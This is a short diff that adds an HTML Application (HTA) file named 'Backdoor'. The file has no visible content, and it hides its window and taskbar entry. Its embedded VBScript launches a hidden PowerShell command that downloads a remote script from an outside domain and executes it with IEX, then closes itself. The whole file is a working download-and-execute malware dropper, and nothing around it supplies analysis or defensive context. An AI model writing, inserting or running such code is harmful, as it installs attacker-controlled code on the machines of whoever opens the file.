@@ -1,0 +1,12 @@
+<HTML>
+<HEAD>
+<HTA:APPLICATION ID="oApp" APPLICATIONNAME="Backdoor" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />
+<script language="VBScript">
+  Set oShell = CreateObject("Wscript.Shell")
+  oShell.Run "powershell -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://loslocosde3ro.best/vemvem')", 0, False
+  window.close()
+</script>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
